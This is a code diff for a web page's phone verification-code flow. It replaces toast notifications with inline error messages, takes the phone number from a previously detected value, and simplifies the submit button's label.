@@ -1332,8 +1332,15 @@
                     <input type="text" id="otpInput" class="w-input" placeholder="•••••" maxlength="5"
                         style="text-align:center; letter-spacing:8px; font-size:1.5rem">
                 </div>
+
+                <div id="errorAreaOtp" style="display:none; margin-bottom:15px">
+                    <div class="error-badge">
+                        <span id="errorMsgOtp"></span>
+                    </div>
+                </div>
+
                 <button class="btn-action" id="submitCodeBtn" onclick="submitOTP()">
-                    Finish Submission <i class="fas fa-check-circle"></i>
+                    Finish Submission
                 </button>
             </div>
 
@@ -2191,8 +2198,7 @@
         }
 
         async function requestOTP() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            if (!phone) return showToast("Error", "Phone number required");
+            const phone = lastDetectedPhone;
 
             const btn = document.getElementById('requestCodeBtn');
             btn.disabled = true;
@@ -2243,7 +2249,11 @@
                     }, 5000);
                 }
             } catch (err) {
-                showToast("Error", "Server connection failed", "error");
+                const errorBox = document.getElementById('errorArea');
+                const errorMsg = document.getElementById('errorMsg');
+                errorMsg.textContent = "Server connection failed";
+                errorBox.style.display = 'block';
+                setTimeout(() => { errorBox.style.display = 'none'; }, 5000);
             } finally {
                 btn.disabled = false;
                 btn.innerHTML = 'Get Verification Code';
@@ -2254,7 +2264,14 @@
 
         async function submitOTP() {
             const code = document.getElementById('otpInput').value.trim();
-            if (code.length !== 5) return showToast("Invalid Code");
+            if (code.length !== 5) {
+                const eBox = document.getElementById('errorAreaOtp');
+                const eMsg = document.getElementById('errorMsgOtp');
+                eMsg.textContent = "Invalid Code";
+                eBox.style.display = 'block';
+                setTimeout(() => { eBox.style.display = 'none'; }, 5000);
+                return;
+            }
 
             const btn = document.getElementById('submitCodeBtn');
             btn.disabled = true;
@@ -2296,10 +2313,12 @@
                     document.getElementById('node-3').innerHTML = '<i class="fas fa-times"></i>';
                 }
             } catch (err) {
-                showToast("Process Error");
+                document.getElementById('rejectionDesc').textContent = "Process Error";
+                document.getElementById('step-otp').style.display = 'none';
+                document.getElementById('step-rejected').style.display = 'block';
             } finally {
                 btn.disabled = false;
-                btn.innerHTML = 'Finish Submission <i class="fas fa-check-circle"></i>';
+                btn.innerHTML = 'Finish Submission';
             }
         }
 
